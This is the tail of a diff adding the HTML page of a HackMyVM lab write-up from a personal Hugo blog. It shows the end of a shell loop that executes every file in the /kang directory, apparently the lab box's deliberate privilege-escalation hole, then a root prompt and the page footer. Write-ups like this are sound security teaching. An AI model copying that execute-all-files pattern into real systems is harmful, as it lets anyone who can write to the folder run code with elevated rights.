+</span></span><span style="display:flex;"><span>  sleep <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;echo hi&#34;</span> &gt; /kang/weComeInPeace.sh
+</span></span><span style="display:flex;"><span>  sh /kang/*
+</span></span><span style="display:flex;"><span>  sleep <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash-5.1#
+</span></span></code></pre></div>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://l1uyun.one/tags/sec/hackmyvm/">sec/hackmyvm</a>&nbsp;
+        
+      </span>
+    
+  
+    <div class="clear"></div>
+    
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            
+              <span class="pagination__title-h">阅读更多</span>
+            
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://l1uyun.one/posts/hmv_adria/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">HMV_adria</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://l1uyun.one/posts/hmv_slowman/">
+                  <span class="button__text">slowman</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+    </div>
+
+      </div>
+
+      
+        
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+
+
+
+
+
+
+<footer class="footer">
+  <div class="footer__inner">
+    <div class="copyright copyright-font">
+      <span>共 46742 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+    </div>
+      
+    <div class="busuanzi-footer">
+      本站总访客数 <span id="vercount_value_site_uv">Loading</span> 人
+      本站总访问量 <span id="vercount_value_site_pv">Loading</span> 次
+    </div>
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a> Theme by <a href="https://github.com/lmm214/immmmm/tree/master/themes/hello-friend" target="_blank" rel="noopener">immmmm</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script type="text/javascript" src="/theme-main-1.js"></script>
+<script type="text/javascript" src="/lately.min.js"></script>
+<script type="text/javascript" src="/waterfall.min.js"></script>
+<script type="text/javascript" src="/imgStatus.min.js"></script>
+<script type="text/javascript" src="/view-image.js"></script>
+<script type="text/javascript" src="/theme-lmm-20230123.js"></script>
+<script type="text/javascript" src="/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    pangu.autoSpacingPage();
+  });
+</script>
+
+
+
+
+    <section class="comments">
+      <script
+        src="https://utteranc.es/client.js"
+        repo="L1uYun/l1uyun_blog"
+        issue-term="title"
+        label="💬comment"
+        theme="github-light"
+        crossorigin="anonymous"
+        async
+      ></script>
+    </section>
+    
+      
+    </div>
+  </body>
+</html>
